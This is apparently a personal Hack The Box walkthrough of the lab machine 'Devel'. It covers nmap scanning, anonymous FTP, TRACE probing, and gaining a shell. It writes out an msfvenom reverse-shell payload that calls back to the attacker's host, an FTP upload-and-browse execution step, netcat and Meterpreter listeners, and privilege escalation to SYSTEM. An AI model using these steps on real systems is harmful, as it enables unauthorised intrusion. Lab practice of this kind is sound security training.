# Devel 10.10.10.5 - Windows

 - __User__: 004 - 2nd Attempt
 - __Root__: 004 - 2nd Attempt

## Initial Attempt, 04/30/2020

`nmap -sC -sV -oA devel 10.10.10.5`

```shell
# Nmap 7.80 scan initiated Thu Apr 30 22:43:34 2020 as: nmap -sC -sV -oA devel 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up (0.033s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 30 22:43:45 2020 -- 1 IP address (1 host up) scanned in 11.65 seconds
```

#### Initial Ideas

Open Ports:

 - 21 FTP
  - Anonymous Login allowed? (code 230)
 - 80 IIS v7.5
  - FTP gives clue to iisstart.htm and welcome.png possibly hosted
  - Potentially risky method "TRACE" ?

Goals:

 - Look into anonymous FTP login situation
 - WTF is HTTP `TRACE` method?
 - Any vulns for IIS 7.5?

#### FTP Port 21

 - FTP worked for user `anonymous` and password `none@na.com` or blank

```shell
thoth@kali:~/Projects/htb-notes/machines/Devel/dumps$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:thoth): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp>
```

 - Within the FTP found the following file structure:

```shell
aspnet_client/
  ..
  system_web/
    ..
    2_0_50727/
welcome.png
iisstart.htm
```

Directories seem to lead nowhere, can't see any files. Poked around some FTP commands, didn't find anything. Might be more to explore here with my lack of FTP command knowledge. Can we probe for more user accounts? I am able to upload files with `send`... hmm. Perhaps look into IIS file structure and if I can work toward RCE via this?

#### Web Server Microsoft IIS on Port 80

This is version 7.5 of IIS, which was released with Windows 7 and Windows Server 2008 R2. Can't find exact lifetime dates.

 - HTTP `TRACE` led me to [this Cross-Site Tracing paper](https://www.cgisecurity.com/whitehat-mirror/WH-WhitePaper_XST_ebook.pdf)

 - Attempting the basic echo they illustrate seems to fail. Perhaps I don't know how to issue telnet properly. Tried to curl it, that didn't work either.

```shell
thoth@kali:~/Projects/htb-notes/machines/Devel/dumps$ telnet 10.10.10.5 80
Trying 10.10.10.5...
Connected to 10.10.10.5.
Escape character is '^]'.
TRACE / HTTP/1.1
Host: foo.bar
X-Header: test
^]
HTTP/1.1 400 Bad Request
Content-Type: text/html; charset=us-ascii
Server: Microsoft-HTTPAPI/2.0
Date: Mon, 04 May 2020 11:43:37 GMT
Connection: close
Content-Length: 339
```

```shell
thoth@kali:~/Projects/htb-notes/machines/Devel/dumps$ curl -v -X TRACE -H "Host: foo.bar" -H "X-Header: test" 10.10.10.5
*   Trying 10.10.10.5:80...
* TCP_NODELAY set
* Connected to 10.10.10.5 (10.10.10.5) port 80 (#0)
> TRACE / HTTP/1.1
> Host: foo.bar
> User-Agent: curl/7.68.0
> Accept: */*
> X-Header: test
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 501 Not Implemented
< Content-Type: text/html
< Server: Microsoft-IIS/7.5
< X-Powered-By: ASP.NET
< Date: Mon, 04 May 2020 11:41:57 GMT
< Content-Length: 1508

<html removed>
```
 - The paper goes on to describe using JS to grab response data, I tried:

 ```html
 <!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
  </head>
  <body>
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open('TRACE', 'http://10.10.10.5/', false);
      xhr.send(null);
      if(200 == xhr.status)
        alert(xhr.responseText);
    </script>
  </body>
</html>
```
... the result being blocked by the browser with `SecurityError: The operation is insecure.`. We're trying old shit.

#### Watched Ippsec, CyberMentor

 - I saw the proper entry point, I was not aware of the `msfvenom` tool to generate malware in specific formats. I see now we can easily generate exploit scripts to place on vulnerable servers, even without knowing how the scripts themselves work.

 - Going to try a non-meterpreter route first. Issuing a listen on netcat: `nc -lvnp 7680`

 - Generating attack script with `msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.2 LPORT=7680 -f aspx > shell.aspx`

 - Upload via `send` on the anonymous FTP access

 - Execute the script by navigating browser to `http://10.10.10.5/shell.aspx`

```shell
thoth@kali:~/Projects/htb-notes/machines/Devel$ nc -lvnp 7680
listening on [any] 7680 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.5] 49178
```

This failed. Just hung there, several times. Decided to try a different exploit:

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=7680 -f aspx > shell.aspx`

 - Upload to FTP. Re-run `nc -lvp 7680`, fire it off, and... success:

```powershell
thoth@kali:~/Projects/htb-notes/machines/Devel$ nc -lvp 7680
listening on [any] 7680 ...
10.10.10.5: inverse host lookup failed: Unknown host
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.5] 49181
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web

c:\windows\system32\inetsrv>
```

Ok, so I'm in webserver user-space. Privilege escalation is next but let's see if we can find info first.

## Second Attempt, 05/05/2020

`nmap -A -T4 -oA devel2 -p- 10.10.10.5`

Alright so last time we poked around the anonymous FTP and were able to place files. We also used `msfvenom` to produce an exploit `windows/shell/reverse_tcp` which we placed with the FTP and executed via web browser request. It failed but the un-staged version `windows/shell_reverse_tcp` was successful, leading to user-space as `iis apppool`. I have since learned that `netcat` listeners will always fail for staged payloads - always go unstaged with `nc`.

So we get some `systeminfo`:

```powershell
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          9/5/2020, 4:57:42 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 718 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 1.554 MB
Virtual Memory: In Use:    493 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
```

 - 32-bit Windows

 - Attempted new payloads of `meterpreter` and same methodology. Connections but no shells. Attempting msfconsole. Tried a number of exploits and scanners, nothing interesting popping up so far.

 - Got meterpreter working, needed to `use multi/handler` and set up a listener instead of netcat. Then used `windows/meterpreter/shell/reverse_tcp` from `msfvenom`.

 - Figured out how to `background` the current meterpreter session to get access to further `msfconsole` injections. Attempted a variety of `search type:exploit windows/local` scripts. At some point learned that I ened to watch `LHOST` to make sure it's set to my HTB network. Found an exploit that finally worked.

 ```shell
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

Got the flags.